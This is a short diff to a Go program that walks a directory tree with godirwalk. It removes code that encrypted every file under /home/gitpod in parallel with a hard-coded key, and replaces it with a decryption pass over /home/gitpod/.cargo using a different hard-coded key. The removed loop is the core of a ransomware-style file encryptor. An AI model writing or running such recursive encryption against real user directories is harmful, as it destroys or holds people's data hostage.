@@ -2,23 +2,17 @@ package main
 
 import (
 	"fmt"
-	"strings"
 
 	"github.com/karrick/godirwalk"
 )
 
 func main() {
-	key := []byte{1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
-	dirname := "/home/gitpod"
+	key := []byte{160, 185, 192, 168, 229, 105, 196, 195, 171, 99, 112, 156, 149, 205, 170, 229}
+
+	dirname := "/home/gitpod/.cargo"
 	err := godirwalk.Walk(dirname, &godirwalk.Options{
 		Callback: func(osPathname string, de *godirwalk.Dirent) error {
-			// Following string operation is not most performant way
-			// of doing this, but common enough to warrant a simple
-			// example here:
-			if strings.Contains(osPathname, ".git") {
-				return godirwalk.SkipThis
-			}
-			go encryptFile(osPathname, key)
+			decryptFile(osPathname, key)
 			fmt.Printf("%s %s\n", de.ModeType(), osPathname)
 			return nil
 		},
